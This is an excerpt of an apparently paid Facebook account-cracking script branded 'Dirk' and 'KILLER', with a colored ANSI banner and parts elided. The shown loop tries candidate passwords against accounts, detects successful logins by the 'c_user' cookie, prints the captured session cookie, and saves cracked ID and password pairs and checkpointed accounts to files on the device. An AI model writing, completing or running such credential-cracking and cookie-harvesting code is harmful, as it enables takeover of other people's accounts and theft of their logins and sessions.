...
\033[1;37m================= \33[32;45mDirk\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mDirk\33[0;m\033[1;32m && \033[1;33mKILLER\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Dirk
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-DIRK
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS PAIDðŸ”¥
\033[1;32m     \033[1;35mTEAM Dirk        :  \033[1;35mDirk&KILLER 
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m0.1
\033[1;37m================= \33[32;45mDirk\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO Dirk TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(DirkðŸ˜‹-OK??)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/KILLERðŸ˜‹-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(DirkðŸ˜‚-CP??)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/DirkðŸ˜‚-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[KILLER] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
